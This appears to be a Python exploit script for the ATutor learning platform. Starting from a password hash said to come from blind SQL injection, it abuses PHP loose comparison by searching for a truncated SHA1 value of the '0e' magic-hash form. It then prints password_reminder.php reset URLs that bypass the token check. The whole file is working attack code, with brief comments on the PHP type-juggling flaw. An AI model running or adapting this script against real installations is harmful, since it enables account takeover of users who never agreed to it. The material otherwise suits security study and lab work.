import time, hashlib, string, itertools, re
from itertools import takewhile
# obtain via blind sqli, for example
curr_pw = '8635fc4e2a0c7d9d2d9ee40ea8bf2edd76d5757e'
# when using the + operator on strings, php trunctates the right hand operand at the first character that is not [0-9].
# If the hand operand begins with [a-zA-Z!-.+{}!@#$%^&*()|\] i.e anything not [0-9] then php truncates the string to 0...
# So we use itertools to calculate the efferective password. Loose comparison I know., where is c++?
effective_pw_calc = ''.join(takewhile(str.isdigit, curr_pw or ''))
effective_pw = int(effective_pw_calc) if effective_pw_calc != '' else '0'
print("effective pw: ", effective_pw)
url = lambda id,g,h: F"http://atutor/ATutor/password_reminder.php?id={id}&g={g}&h={h}"
current_epoch_days = int(((int(time.time()) / 60) / 60) / 24)       # Calculate current Epoch in days
count = 1
prefix_length = 5
hashes = []
print(F"current time: {current_epoch_days}")
for word in map(''.join, itertools.product(string.ascii_lowercase,repeat=int(prefix_length))):
    g = current_epoch_days+count
    h = 0
    id = 1
    hash_val = id + current_epoch_days + count + int(effective_pw)
    hash_full = hashlib.sha1(str(hash_val).encode('utf-8')).hexdigest()
    # Note that in php substr is not equivalent to pythons [start:stop:step]! In other words substr($hash, 5,15) in php grabs 15 characters beggining at position 5 and therefore ends at position 20 in the string
    hash = hashlib.sha1(str(hash_val).encode('utf-8')).hexdigest()[5:20]
    if re.match(r'0+[eE]\d+$', hash):
        hashes.append({'g':str(g),'h':str(h),'id':str(id), 'hash':hash})
        print(F"(+) Hashval: {hash_val}")
        print(F"(+) Full Hash: {hash_full}")
        print(F"(+) Found a valid hash: {hash}")
        print(F"(+) Requests made: {count}")
        print(F"(+) Parameter Values:\ng = {g}\nh = {h}\nid = {id}")
        print(F"(+) Equivalent loose comparison: {hash} == 0" )
        if (len(hashes) >= 10):
            break
    count += 1
for hash in hashes: 
    print(F"(+) {url(hash['id'], hash['g'], hash['h'])}")